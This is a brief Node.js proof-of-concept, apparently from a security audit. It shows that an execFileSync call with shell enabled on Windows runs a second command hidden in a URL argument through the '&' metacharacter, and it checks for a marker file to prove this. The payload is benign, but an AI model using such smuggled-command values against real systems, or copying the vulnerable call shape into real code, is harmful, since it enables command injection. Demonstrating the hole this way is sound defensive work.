// SEC-1 PoC: reproduces the exact execFileSync option shape at
// scripts/eva/capa-001-a-baseline-runner.mjs:195-199 with a DB-shaped URL that
// carries a shell metacharacter legal in a URL query string ('&').
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const path = require('node:path');
const dir = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'sec1-'));
const marker = path.join(dir, 'INJECTED.txt');
const hostileUrl = 'https://example.com/?a=1&echo PWNED> "' + marker + '"';
try {
  execFileSync('node', ['-p', '1', `--url=${hostileUrl}`],
    { cwd: dir, stdio: 'pipe', shell: process.platform === 'win32' });
} catch (_) { /* child exit code is irrelevant to the PoC */ }
console.log('platform          :', process.platform);
console.log('node              :', process.version);
console.log('shell option value:', process.platform === 'win32');
console.log('INJECTION EXECUTED:', fs.existsSync(marker));
fs.rmSync(dir, { recursive: true, force: true });
